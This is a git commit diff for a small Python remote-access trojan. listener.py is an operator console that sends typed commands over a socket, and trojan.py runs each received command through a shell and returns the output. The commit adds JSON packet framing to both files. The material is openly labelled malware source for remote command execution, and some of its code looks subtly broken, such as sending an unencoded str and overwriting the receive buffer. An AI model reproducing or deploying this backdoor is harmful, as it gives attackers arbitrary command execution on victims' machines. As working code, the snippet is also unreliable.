6eea6cfd7630f93865d08f3677691bd4e07a3b05
Sqortle <mirzasincap@gmail.com>
2025-07-22 12:32:04 +0300

    packeting added

--- listener.py
+++ listener.py
@@ -1,4 +1,5 @@
 import socket
+import simplejson as json
 
 
 class Listener:
@@ -12,12 +13,25 @@ class Listener:
 
         (self.link_1, address) = link.accept()
 
+    def packeting(self, data):
+        packet = json.dumps(data)
+        self.link_1.sendall(packet.encode("utf-8"))
+
+    def packet_decode(self):
+        incoming_data = ""
+        while True:
+            try:
+                incoming_data = incoming_data + self.link_1.recv(1024).decode("utf-8")
+                return json.loads(incoming_data)
+            except ValueError:
+                continue
+
     def start(self):
         while True:
             entrance = input("Write a command: ")
-            self.link_1.sendall(entrance.encode("utf-8"))
-            incoming_data = self.link_1.recv(1024).decode("utf-8")
-            print(incoming_data)
+            self.packeting(entrance)
+            output = self.packet_decode()
+            print(output)
 
 
 listener = Listener(ip="127.0.0.1", port=8080)
--- trojan.py
+++ trojan.py
@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import simplejson as json
 
 
 class Trojan:
@@ -12,11 +13,24 @@ class Trojan:
     def command_process(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def packeting(self, data):
+        packet = json.dumps(data)
+        self.link.send(packet)
+
+    def packet_decode(self):
+        incoming_data = ""
+        while True:
+            try:
+                incoming_data = self.link.recv(1024).decode("utf-8")
+                return json.loads(incoming_data)
+            except ValueError:
+                continue
+
     def start(self):
         while True:
-            command = self.link.recv(1024).decode("utf-8")
+            command = self.packet_decode()
             data = self.command_process(command)
-            self.link.send(data)
+            self.packeting(data)
 
         self.link.close()
 
